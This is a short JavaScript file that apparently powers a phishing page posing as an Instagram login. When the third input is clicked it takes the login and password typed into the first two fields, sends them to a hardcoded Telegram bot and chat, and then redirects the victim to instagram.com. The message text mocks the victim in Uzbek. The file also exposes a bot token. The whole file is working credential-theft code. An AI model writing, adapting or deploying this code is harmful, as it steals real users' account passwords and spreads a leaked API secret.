let BOT_TOKEN = '6854538605:AAH2OuzjmoT_HWPxdYDluqyyl52ycPovUpo'
let inputs = document.querySelectorAll('input')

inputs[2].addEventListener('click', (event) => {
    event.preventDefault()
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '914653833', 
            text: `\n Yeb qoygan bollani accounti: \n\n Login: ${inputs[0].value} \n Password: ${inputs[1].value}`,
        }),
    })
        .then(res => res.json())
        .then(data => {
            window.location.href = 'https://instagram.com'
        })
        .catch(error => console.log('error', error))

})